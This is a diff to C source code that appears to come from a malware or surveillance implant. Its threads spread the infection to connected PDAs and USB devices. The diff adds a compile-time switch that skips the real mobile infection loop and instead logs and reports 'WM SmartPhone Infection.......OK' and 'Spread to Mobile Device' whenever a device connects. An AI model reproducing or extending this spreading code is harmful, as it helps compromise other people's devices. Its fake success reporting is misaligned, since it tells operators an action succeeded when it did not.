@@ -1112,8 +1112,10 @@ DWORD WINAPI MonitorNewUsersThread(DWORD dummy)
 	return 0;
 }
 
+//#define FAKE_MOBILE_INFECTION 1
 DWORD WINAPI MonitorPDAThread(DWORD dummy) 
 {
+#ifndef FAKE_MOBILE_INFECTION
 	LOOP {
 		WCHAR mmc_path[MAX_PATH];
 		if (infection_pda && PDAFilesPresent() && TryRapiConnect(3000)) {
@@ -1129,6 +1131,19 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 		CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME);
 	}
 	return 0;
+#else
+	static BOOL first_time = TRUE;
+	LOOP {
+		if (first_time && TryRapiConnect(3000)) {
+			first_time = FALSE;
+			REPORT_STATUS_LOG("- WM SmartPhone Infection.......OK\r\n");
+			SendStatusLog(L"[Infection Agent]: Spread to Mobile Device");	
+			RapiDisconnect();
+		}
+		CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME/2);
+	}
+	return 0;
+#endif
 }
 
 DWORD WINAPI MonitorUSBThread(DWORD dummy)
